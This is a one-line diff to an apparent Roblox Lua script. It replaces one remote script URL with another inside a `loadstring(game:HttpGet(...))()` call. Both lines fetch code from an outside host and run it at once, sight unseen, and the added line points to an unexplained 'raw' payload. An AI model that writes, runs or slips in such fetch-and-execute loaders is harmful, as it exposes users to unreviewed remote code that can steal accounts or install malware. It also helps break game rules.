@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://encrypt-x.pages.dev/Scripts?Id=9302760263003"))("9302760263003")
+loadstring(game:HttpGet("https://prometheus.bonkhub.online/raw/f3462d308387b800"))()
